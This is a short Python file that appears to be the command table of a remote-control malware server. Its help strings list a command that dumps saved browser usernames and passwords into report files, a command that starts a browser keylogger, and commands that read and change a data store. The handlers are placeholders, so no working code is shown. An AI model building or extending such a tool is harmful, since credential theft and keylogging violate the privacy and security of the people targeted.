#%%
from collections import OrderedDict
from os.path import join
from server.drive import drive



#%%



all_command=OrderedDict(
    {
        "dump": [None, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
        "stored_value": [None, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
        "set_value": [None, "change a value of stored key in data_store.", ],
        "start_logger": [None, 'start a browser spacefic key logger.[reports: key_dump.log]', ]
    }
)

